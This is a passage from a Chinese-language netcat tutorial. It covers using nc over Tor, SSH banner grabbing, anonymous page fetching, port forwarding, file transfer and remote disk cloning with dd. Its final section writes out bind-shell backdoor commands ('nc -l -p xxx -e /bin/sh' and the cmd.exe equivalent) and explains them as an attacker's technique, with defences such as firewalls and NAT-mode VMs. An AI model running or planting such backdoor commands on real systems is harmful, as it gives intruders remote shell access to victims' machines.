<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">alias nc-tor=&#x27;nc -X 5 -x 127.0.0.1:<span class="hljs-number">9050</span>&#x27;<br></code></pre></td></tr></table></figure>
<p>　　设置好之后，你只要用 <code>nc-tor</code> 就可以自动追加代理选项。<br>　　如果想让别名【永久】生效，要把上述命令加入到：你当前使用的 shell 的启动文件中。<br>　　再次唠叨：“裸 Tor”与“Tor Browser”的监听端口有差异。俺上述命令的 <code>9050</code> 是用于“裸 Tor”。</p>
<h2 id="★招数5：（信息收集）用-nc-探测“服务器类型”和“软件版本”（以-SSH-为例）"><a href="#★招数5：（信息收集）用-nc-探测“服务器类型”和“软件版本”（以-SSH-为例）" class="headerlink" title="★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）"></a>★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）</h2><h3 id="◇使用场景-4"><a href="#◇使用场景-4" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　入侵者在发起攻击之前，有一个很重要的步骤叫做【信息收集】。攻击者对目标了解得越多，得手的机会就越大。<br>　　下面俺以 SSH Server（sshd）举例。</p>
<h3 id="◇方法-4"><a href="#◇方法-4" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　如今要【远程管理】服务器，最常用的大概就是 SSH 这种方式了。<br>　　如果某个服务器运行了 SSH 服务端（默认监听端口是 <code>22</code>），那么用如下命令可以看出：该服务器的操作系统类型，以及 SSH server 的版本。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP <span class="hljs-number">22</span><br><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>

<p><strong>选项 <code>-v</code></strong><br>　　玩这招时，最好加 <code>-v</code> 选项——nc 会先显示“端口已经连上”或者“端口连不上”。</p>
<p><strong>选项 <code>-q</code></strong><br>　　（关于该选项的说明，参见“招数4”章节的【延时退出】）</p>
<p><strong><code>nc-tor</code> 别名</strong><br>　　（关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理）</p>
<p>　　前面聊了这么久，一直没有给出【实例】。现在来一个【真实的】例子——用 nc 探测 Github 的 SSH 端口<br>　　（注：在如下终端窗口中，头一行是命令，后面两行是输出）</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> ssh.github.<span class="hljs-keyword">com</span> <span class="hljs-number">22</span><br><br>Connection <span class="hljs-keyword">to</span> ssh.github.<span class="hljs-keyword">com</span> <span class="hljs-number">22</span> port [tcp/ssh] succeeded!<br>SSH-<span class="hljs-number">2.0</span>-babeld-dae25663<br></code></pre></td></tr></table></figure>


<h3 id="◇补充说明：echo-命令"><a href="#◇补充说明：echo-命令" class="headerlink" title="◇补充说明：echo 命令"></a>◇补充说明：echo 命令</h3><p>　　上述用到的 <code>echo</code> 命令是 POSIX 下常用的命令。Windows 的命令行中也有同名的命令，但功能/用法有【差异】。</p>
<h3 id="◇补充说明：批处理-＆-自动化"><a href="#◇补充说明：批处理-＆-自动化" class="headerlink" title="◇补充说明：批处理 ＆ 自动化"></a>◇补充说明：批处理 ＆ 自动化</h3><p>　　某些“有心人”甚至可以搞一个脚本，批量探测某个 IP 地址段的 22 端口，然后把找到的服务器信息保存在某个文件中。<br>　　另外，<br>　　有的系统管理员会把 sshd 的监听端口从 <code>22</code> 改为其它数值，想要迷惑攻击者。但这么干，【效果不大】。<br>　　攻击者可以先进行端口扫描，拿到所有已开启的 TCP 监听端口；然后利用上述方法，对这些 TCP 端口进行【自动化】探测，从而判断出哪个端口是 SSH Server。</p>
<h3 id="◇补充说明：防范措施"><a href="#◇补充说明：防范措施" class="headerlink" title="◇补充说明：防范措施"></a>◇补充说明：防范措施</h3><p>　　本章节以“SSH Server”举例来说明入侵者如何探测服务端的软件版本。<br>　　除了“SSH Server”，很多其它的服务端软件，也存在类似的【信息暴露】。<br>　　一个谨慎的系统管理员，应该通过定制，【消除 or 伪造】这些信息，从而增加入侵者的攻击成本。</p>
<h2 id="★招数6：（隐匿性）用-nc-实现【彻底无痕】的-Web-访问"><a href="#★招数6：（隐匿性）用-nc-实现【彻底无痕】的-Web-访问" class="headerlink" title="★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问"></a>★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问</h2><h3 id="◇使用场景-5"><a href="#◇使用场景-5" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　有时候，俺想要看某个 Web 服务器上的某个页面的内容，但是又【不希望】在那上面留下俺本人的任何痕迹。这里所说的“痕迹”既包括【网络】层面滴，也包括【操作系统 ＆ 软件】层面滴。<br>　　要搞定【网络】层面，很简单——主要靠【暗网】（Tor or I2P），来掩盖你的【真实】“公网 IP”。具体的玩法，前面章节已经聊过啦。<br>　　要搞定【操作系统 ＆ 软件】层面，稍微麻烦一点。如果你用传统的浏览器（Chrome、Firefox、IE、Edge …）访问了某个页面。即使你禁用了 JS，伪造了浏览器的“User Agent”。但如果 Web 服务器想要收集你的系统指纹，还是有若干办法——可以通过浏览器的一些差异，获得某些信息量（安全行话叫做“浏览器指纹”）。<br>　　比如说：HTTP 协议的【Header】字段可能会包含某些信息。<br>　　比如说：不同内核的浏览器，对页面的渲染会有差异。对页面中的【外部】元素（图片、JS、CSS …）的加载效率也会有差异。<br>　　比如说：即使同一款浏览器，在不同系统平台上，依然会表现出某些差异。<br>　　……</p>
<p>　　此时，nc 再度派上用场——你可以用 nc 直接抓取页面，保存到本机。<br>　　这种玩法相当于——让 nc 在【裸 TCP】层面执行 HTTP 协议的命令。在整个过程中，浏览器完全【不】参与其中。既【不会】暴露浏览器的信息，也【不会】暴露操作系统的信息。</p>
<h3 id="◇方法-5"><a href="#◇方法-5" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　先执行下列两个命令的其中一个（具体看你想用“IP”还是“域名”）</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 端口<br>echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP 端口<br></code></pre></td></tr></table></figure>

<p>　　然后 nc 就会把这个页面抓下来，打印到命令行终端。这时候你看到的是【HTML 源代码】。</p>
<p>　　上述命令访问的是 Web Server 的【根路径】。如果你想要看其它路径的页面（比如说：<code>/index.html</code>），稍微修改成如下：</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /index.html HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 端口<br>echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /index.html HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP 端口<br></code></pre></td></tr></table></figure>

<p>　　由于正常人类是无法直接阅读【HTML 源代码】滴。为了更加人性化，你可以把 nc 抓下来的 HTML 源代码，（在命令行中用“大于号”）重定向到某个 HTML 文件，然后就可以用你本机的浏览器阅读之。</p>
<p><strong><code>nc-tor</code> 别名</strong><br>　　（关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理）</p>
<p><strong>选项 <code>-q</code></strong><br>　　（关于该选项的说明，参见“招数4”章节的【延时退出】）</p>
<h3 id="◇补充说明：HTTP-协议"><a href="#◇补充说明：HTTP-协议" class="headerlink" title="◇补充说明：HTTP 协议"></a>◇补充说明：HTTP 协议</h3><p><strong>协议版本</strong><br>　　有些同学会奇怪——为啥俺上述的示例用的是 1.0 而不是 1.1？<br>　　主要是为了偷懒——按照 RFC 的规范，HTTP 1.1 的 Request 中，<code>Host</code> 是【必须】的字段；而在 HTTP 1.0 中，这个字段是【可选】滴。</p>
<p><strong>HTTPS</strong><br>　　nc 的“OpenBSD 变种”还【不】支持 HTTPS（SSL/TLS）。<br>　　在本文末尾介绍的其它变种里面，ncat ＆ socat 已经完全支持 SSL/TLS 协议。<br>　　由于本文主要介绍 nc 的“OpenBSD 变种”，关于 ncat ＆ socat 的话题，就不展开啦。</p>
<h3 id="◇补充说明：这种方式的【缺点】"><a href="#◇补充说明：这种方式的【缺点】" class="headerlink" title="◇补充说明：这种方式的【缺点】"></a>◇补充说明：这种方式的【缺点】</h3><p><strong>关于“页面的【外部】元素”</strong><br>　　用这招，nc 只抓取页面本身，不包括页面中的外部元素（图片、JS、CSS …）。<br>　　这种方式拿到的页面，阅读的时候会显得比较丑陋（你就凑合着看吧）</p>
<p><strong>关于“JS 引擎”</strong><br>　　由于这招只是在 TCP 层面模拟了简单的 HTTP 协议。所以只能得到【静态 HTML】。<br>　　如果某个页面的内容是依靠【前端 JS】动态生成（所谓的 AJAX 风格），那这招就不灵啦（因为 nc【没有】JS 引擎）。</p>
<h2 id="★招数7：（网络配置）基于-nc-的端口转发（Port-Forward）"><a href="#★招数7：（网络配置）基于-nc-的端口转发（Port-Forward）" class="headerlink" title="★招数7：（网络配置）基于 nc 的端口转发（Port Forward）"></a>★招数7：（网络配置）基于 nc 的端口转发（Port Forward）</h2><h3 id="◇使用场景-6"><a href="#◇使用场景-6" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　关于【端口转发】的相关概念，有啥用处和好处，那篇都已经写了。这里就不再重复唠叨啦。<br>　　在当年那篇教程中，俺主要聊了两个工具，分别是是 rinetd 和 netsh。当年为啥没有介绍 netcat 捏？因为 nc 的功能太强，所谓“杀鸡焉用牛刀”。相比之下，rinetd 的使用非常简单，而 netsh 是 Windows 内置滴工具。<br>　　今天就把当年没聊的给补一下——如何用 nc 玩“端口转发”。</p>
<h3 id="◇原理"><a href="#◇原理" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。<br>　　玩过命令行的同学，应该都知道：大部分 shell 都支持【管道符】（就是那个竖线符号 <code>|</code>），可以把某个进程的标准输出，重定向给另一个进程的标准输入。但是 shell 的“管道符”只能做到“单向配对”，【无法】做到“交叉配对”。所以还需要再借助另一个管道——也就是“命名管道”。<br>　　“命名管道”洋文叫做“named pipe”，是一种进程间通讯（IPC）的机制。顾名思义，“命名管道”就是有名号滴，而 shell 中使用的那个【管道符】，其本质上是“匿名管道”（无名管道）。<br>　　主流的操作系统（Windows、Linux、UNIX）都支持“命名管道”这种机制。由于俺本人的环境是 Linux，下面只以 Linux 举例。</p>
<h3 id="◇方法-6"><a href="#◇方法-6" class="headerlink" title="◇方法"></a>◇方法</h3><p><strong>步骤1：创建命名管道</strong><br>　　用下面这个简单的命令创建一个“命名管道”，其名称叫做 <code>nc_pipe</code>。（俺用这个名称只是为了举例，你也可以用别的名称）</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">mkfifo nc_pipe</span><br></code></pre></td></tr></table></figure>

<p><strong>步骤2：同时启动两个 nc</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">1234</span> &lt; nc_pipe | nc <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">5678</span> &gt; nc_pipe<br></code></pre></td></tr></table></figure>
<p>　　运行上述命令之后，就可以把本机的 <code>1235</code> 端口重定向到本机的 <code>5678</code> 端口。</p>
<p>　　这个命令有点复杂。技术菜鸟如果看不懂，就算了（没关系滴，不影响你看后续的章节）。<br>　　如果你比较喜欢刨根问底，俺稍微解释一下：<br>　　上述命令行中，前一个 nc 充当【服务端】，后一个 nc 充当【客户端】。命令行中的“管道符”使得“服务端 nc”的输出绑定到“客户端 nc”的输入。然后再用 <code>nc_pipe</code> 这个命名管道做中转，使得“客户端 nc”的输出绑定到“服务端 nc”的输入。从而完成了【交叉配对】。</p>
<h3 id="◇补充说明：如何让-nc-的监听端口【持续开启】-1"><a href="#◇补充说明：如何让-nc-的监听端口【持续开启】-1" class="headerlink" title="◇补充说明：如何让 nc 的监听端口【持续开启】"></a>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><p>　　参见“招数2”章节中的“补充说明”。</p>
<h2 id="★招数8：（网络配置）基于-nc-的代理转发（Proxy-Forward）"><a href="#★招数8：（网络配置）基于-nc-的代理转发（Proxy-Forward）" class="headerlink" title="★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）"></a>★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）</h2><h3 id="◇使用场景-7"><a href="#◇使用场景-7" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　提醒一下：<br>　　【不要混淆】本章节与“招数4”。<br>　　“招数4”聊的是——nc 自己通过代理进行网络访问（nc over Tor）。<br>　　“本章节”聊的是——nc 帮助其它网络软件走代理进行网络访问（XX软件 over nc over Tor）。</p>
<p>　　比如说，SSH 是很常用的一个安全工具——用来远程操作服务器。<br>　　在某些特殊场合，俺想要通过 SSH 登录某个服务器，但是又【不希望】服务器记录俺本人【真实的】“公网 IP”（“暴露【真实的】公网 IP”等同于“暴露真实身份”）<br>　　说到这里，很多老读者肯定猜到俺说啥——让 SSH 走 Tor 代理（SSH over Tor）。<br>　　但可惜的是：（POSIX 系统中常用的）OpenSSH 客户端【不支持】SOCKS 代理，而 Tor 默认提供的是 SOCKS 代理。这时候，netcat 就派上用场啦——用 nc 把 SSH 的数据流转发到 Tor 的 SOCKS 代理。</p>
<h3 id="◇方法-7"><a href="#◇方法-7" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　由于 Github 同时提供了几种不同的访问途径（Web、Git、SSH）。对【每一种】Github 的访问方式，俺都介绍了相应的隐匿措施。<br>　　对 SSH 这种访问方式，当时俺介绍的招数就是——用 nc 进行代理转发（把 SSH 的数据流转发到 Tor）<br>　　既然当年已经聊过了，这里就不重复唠叨啦。对这招感兴趣的同学，请猛击上述链接。</p>
<h3 id="◇补充说明：“SSH-over-Tor”与“Tor-over-SSH”"><a href="#◇补充说明：“SSH-over-Tor”与“Tor-over-SSH”" class="headerlink" title="◇补充说明：“SSH over Tor”与“Tor over SSH”"></a>◇补充说明：“SSH over Tor”与“Tor over SSH”</h3><p>　　即使懂技术的同学，有时候也会混淆这两者。俺顺便澄清一下：</p>
<p><strong>Tor over SSH</strong><br>　　这种方式相当于 SSH 作为 Tor 的前置代理。假设你有一个墙外的 SSH server，而且没有被 GFW 屏蔽，就可以用这招，让你的 Tor 客户端通过这个 SSH server 联网。</p>
<p><strong>SSH over Tor</strong><br>　　这是让 SSH 通过 Tor 网络（暗网）连接到 SSH 服务器，从而隐藏 SSH 客户端的【真实】公网 IP。在这种情况下，SSH 服务器看到的访问者 IP 是“Tor 出口节点的公网 IP”。</p>
<h2 id="★招数9：（系统管理）用-nc-传输文件"><a href="#★招数9：（系统管理）用-nc-传输文件" class="headerlink" title="★招数9：（系统管理）用 nc 传输文件"></a>★招数9：（系统管理）用 nc 传输文件</h2><h3 id="◇使用场景-8"><a href="#◇使用场景-8" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　有时候，你需要在两台电脑之间传输文件。也可以用 nc 搞定。<br>　　俺猜到某些技术小白会问：为啥不用 Windows 的共享目录？<br>　　反驳的理由很多——<br>反驳1：这个玩意儿只能在 Windows 上用。<br>反驳2：为了使用“共享目录”，需要启用（Enable）系统中的好几个 service，这会增加你系统的【攻击面】。<br>反驳3：启用的 service 越多，占用的内容也越多，影响性能。<br>……<br>　　还有些同学会问：为啥不用 FTP、SSH（或诸如此类的东东）？<br>　　俺觉得：<br>1、如果只是临时传一个文件，还要额外再去装某某软件的客户端/服务端，岂不是很蛋疼？<br>2、任何服务端软件，（从某种意义上说）都是在【增加攻击面】。</p>
<h3 id="◇方法-8"><a href="#◇方法-8" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　为了叙述方便，假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2</p>
<p>　　你先在【接收端】（B 主机）运行如下命令（其中的 <code>xxx</code> 是端口号）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p xxx &gt; file<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>　　然后在【发送端】（A 主机）运行如下命令。</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx &lt; file1<br></code></pre></td></tr></table></figure>
<p>　　第二条命令中的 <code>xxx</code> 是端口号，要与第一条命令中的端口号相同；第二条命令中的 <code>x.x.x.x</code> 是【主机 B】的 IP 地址。</p>
<h3 id="◇补充说明：nc-的性能优势"><a href="#◇补充说明：nc-的性能优势" class="headerlink" title="◇补充说明：nc 的性能优势"></a>◇补充说明：nc 的性能优势</h3><p>　　用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。<br>　　（不熟悉网络分层的同学，再去复习一下本文开头的 OSI 模型）<br>　　如果你传输的文件【超级大】或者文件数量【超级多】，用 nc 传输文件的性能优势会很明显（相比“FTP、SSH、共享目录…”而言）</p>
<h2 id="★招数10：（系统管理）用-nc-远程备份整个磁盘"><a href="#★招数10：（系统管理）用-nc-远程备份整个磁盘" class="headerlink" title="★招数10：（系统管理）用 nc 远程备份整个磁盘"></a>★招数10：（系统管理）用 nc 远程备份整个磁盘</h2><h3 id="◇使用场景-9"><a href="#◇使用场景-9" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　当你学会“用 nc 传输文件”，还可以用 nc【复制整个硬盘】。<br>　　无论是对“系统管理员”，还是对“入侵者”甚至是“数据取证人员”，这招都是蛮有用滴。</p>
<p>　　考虑到某些读者是“技术菜鸟”，俺稍微说明一下。<br>　　“磁盘复制”【不同于】“在两块磁盘之间复制文件”。两者之间有很多差别，至少包括：<br><strong>性能差异</strong>——如果“源盘”上有非常多的小文件，“在两块磁盘之间复制文件”就会【非常慢】。<br><strong>完整性差异</strong>——“磁盘复制”可以确保两块盘的内容是完全一致滴。而如果你仅仅在两块磁盘之间复制文件，很多信息都损失掉了。<br>　　一般来说，“系统管理员”和“入侵者”更看重第1个差异（性能）；而“数据取证人员”更看重第2个差异（完整性）。</p>
<h3 id="◇原理-1"><a href="#◇原理-1" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　为了传输整个磁盘，你需要用到 <code>dd</code> 命令。这玩意儿源自 UNIX，后来也移植到 Linux 和 Windows。<br>　　关于 <code>dd</code> 命令的更详细介绍，可以参见“维基百科”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Dd_(Unix)">这里</a>）或“Gnu 官网”（<a target="_blank" rel="noopener" href="https://www.gnu.org/software/coreutils/dd">这里</a>）。</p>
<p>　　通过 <code>dd</code> 命令，你可以把“整个硬盘”（或者硬盘上的某个“物理分区”、“逻辑分区”）dump 成一个文件。<br>　　在本章节，由于最终目的是要【跨主机备份磁盘】，所以并【不】需要真的把 <code>dd</code> 命令的输出保存成文件，而是把 <code>dd</code> 的输出通过管道符（<code>|</code>）重定向给【本机】的 nc，然后让【本机】的 nc 发送到另一台主机的 nc（参见前一个招数）。</p>
<h3 id="◇方法-9"><a href="#◇方法-9" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　由于操作物理磁盘会涉及到操作系统的差异，下面俺以 Linux 举例。<br>　　假设你要把 A 主机 <code>/dev/sda</code> 磁盘的【原始数据】整个复制到 B 主机的 <code>/dev/sdb</code> 磁盘。</p>
<p>　　你先在【接收端】（B 主机）运行如下命令（其中的 <code>xxx</code> 是端口号）</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">nc -l -p xxx | dd of=<span class="hljs-regexp">/dev/</span>sdb<br></code></pre></td></tr></table></figure>

<p>　　然后在【发送端】（A 主机）运行如下命令。</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">dd <span class="hljs-keyword">if</span>=/dev/sda | nc <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx<br></code></pre></td></tr></table></figure>
<p>　　第二条命令中的 <code>xxx</code> 是端口号，要与第一条命令中的端口号相同；第二条命令中的 <code>x.x.x.x</code> 是【主机 B】的 IP 地址。</p>
<h3 id="◇补充说明：nc-的性能优势-1"><a href="#◇补充说明：nc-的性能优势-1" class="headerlink" title="◇补充说明：nc 的性能优势"></a>◇补充说明：nc 的性能优势</h3><p>　　如今的存储设备越来越大了。“磁盘”或者“分区”，动不动都是几百个 GB，这时候 nc 的【性能优势】就体现出来啦。<br>　　（具体的原因，前一个章节已经分析过了）</p>
<h2 id="★招数11：（入侵手法）用-nc-开启【被动】连接型后门"><a href="#★招数11：（入侵手法）用-nc-开启【被动】连接型后门" class="headerlink" title="★招数11：（入侵手法）用 nc 开启【被动】连接型后门"></a>★招数11：（入侵手法）用 nc 开启【被动】连接型后门</h2><p>　　既然聊 netcat，很自然地会聊到“黑客/骇客”的入侵招数。<br>　　做这方面的介绍，并【不是】为了传授入侵技巧；而是为了——让那些注重安全性的同学，能做到“知己知彼”。</p>
<h3 id="◇使用场景-10"><a href="#◇使用场景-10" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　假设1：你使用的浏览器存在某个安全漏洞，并且该漏洞会让攻击者获得【执行代码】的机会。<br>　　假设2：你在某个公共场合使用某个 wifi 热点上网。遗憾的是，这个热点是攻击者设置的陷阱。<br>　　假设3：设置该陷阱的攻击者，正好也知道：如何利用上述漏洞。<br>　　当这三个假设都成立，攻击者就可以获得在你【本机】执行代码的机会。这时候，攻击者可以下载一个 nc 到你本机，然后用 nc 开启一个【被动】连接型后门。所谓的“【被动】连接型”就是指——nc 开启对外监听端口。<br>　　在该场景中，因为攻击者与你处于【同一个局域网】，攻击者自然能从自己的机器访问到你本机的 nc 后门。</p>
<h3 id="◇原理-2"><a href="#◇原理-2" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　为了让后门能工作，通常会使用 nc 的 <code>-e</code> 选项，该选项的“选项值”是一个可执行文件的路径。<br>　　设置了该选项之后，当处于监听状态的 nc 接受到某个连接，会启动“选项值”对应的可执行文件（并得到某个进程），nc 会把该进程的“标准输入输出”与网络通讯【对接】。<br>　　为了让这个后门用起来足够爽，攻击者通常会让 nc 去启动一个【shell 进程】。对 Windows 系统而言，就是 <code>cmd.exe</code>；对 POSIX 系统（Linux or UNIX）而言，就是 <code>/bin/sh</code><br>　　在这种情况下（nc 挂载 shell），攻击者远程连入 nc 的端口，就可以直接在这个 shell 上进行各种操作，其效果类似于 SSH 或（老式的）telnet。</p>
<h3 id="◇入侵方法"><a href="#◇入侵方法" class="headerlink" title="◇入侵方法"></a>◇入侵方法</h3><p><strong>步骤1</strong><br>　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门（其中的 <code>xxx</code> 是端口号）</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">xxx</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure>
<p>　　如果受害者是 POSIX 系统（Linux or UNIX），则用如下命令：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -l -p xxx -e <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>

<p><strong>步骤2</strong><br>　　后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。</p>
<h3 id="◇补充说明：-e-选项"><a href="#◇补充说明：-e-选项" class="headerlink" title="◇补充说明：-e 选项"></a>◇补充说明：<code>-e</code> 选项</h3><p>　　据说是考虑到 <code>-e</code> 选项太过危险，nc 的 OpenBSD 变种（在多年前）已经【移除】了该选项。但其实捏，还是可以用间接的方式达到同样的效果（具体如何做，俺就不透露啦）。<br>　　另，“原版 nc”依然有这个选项；nc 的很多其它变种，也依然有这个选项。</p>
<h3 id="◇【不够】靠谱的防范措施"><a href="#◇【不够】靠谱的防范措施" class="headerlink" title="◇【不够】靠谱的防范措施"></a>◇【不够】靠谱的防范措施</h3><p>　　在这个场景中，大伙儿可能会想到三个值得改进之处：<br>1、浏览器的漏洞<br>2、使用公共 wifi 热点的习惯<br>3、防火墙的设置</p>
<p>　　对第1点<br>　　其实是【无解】滴！因为任何人都无法确保浏览器是【零漏洞】；</p>
<p>　　对第2点<br>　　要看每个人的具体情况而定。对有些人而言，“用公共热点上网”属于【刚需】。那就没办法了。</p>
<p>　　对第3点<br>　　“防火墙”这招，似乎是比较通用的解决之道。对大部分人而言，桌面 PC 根本就【不必】开启对外监听端口。因此，你可以配置操作系统自带防火墙，禁止【所有的】对外监听端口。<br>　　但是！（俺要开始说【但是】了）<br>　　操作系统自带的防火墙，本身也运行在操作系统【之内】。如果你是以【管理员身份】遭遇入侵，入侵者在进行【代码执行】的时候，就已经具有了【管理员权限】。在这个权限下，入侵者完全有可能“搞定”防火墙。方法有很多种——<br>比如说：把用作后门的端口号，悄悄加入到防火墙的白名单中；<br>再比如说：直接把防火墙的过滤模块干掉；<br>更牛逼的入侵者，甚至可以在【网卡驱动】上做文章——因为网卡驱动位于防火墙的过滤模块【之下】（比防火墙更底层）</p>
<h3 id="◇【靠谱】的防范措施——NAT-模式的虚拟机（Guest-OS）"><a href="#◇【靠谱】的防范措施——NAT-模式的虚拟机（Guest-OS）" class="headerlink" title="◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）"></a>◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）</h3><p>　　首先，这里所说的“NAT 模式”指的是【虚拟机的网卡模式】。如果你不熟悉虚拟机的网卡模式，建议先看俺写的《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/10/system-vm-0.html">扫盲操作系统虚拟机</a>》系列教程。</p>
<p>　　要想用这招，步骤如下：<br>1、当然先要安装【虚拟化软件】（VBox、VMware …），<br>2、安装一个虚拟的操作系统（洋文叫“Guest OS”）<br>3、虚拟系统的网卡设置为【NAT】模式</p>
<p>　　完成上述步骤后，你就可以在这个虚拟系统中上网。<br>　　NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。<br>　　在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】啦。</p>
<h3 id="◇补充说明：“NAT-模式”如何搭配“系统防火墙”？"><a href="#◇补充说明：“NAT-模式”如何搭配“系统防火墙”？" class="headerlink" title="◇补充说明：“NAT 模式”如何搭配“系统防火墙”？"></a>◇补充说明：“NAT 模式”如何搭配“系统防火墙”？</h3><p>　　上述“NAT 招数”与“系统防火墙”并【不】矛盾。<br>　　也就是说，即使你用了这招，你的物理系统（Host OS）还是要配置系统防火墙，并禁止【所有的】对外监听端口。</p>
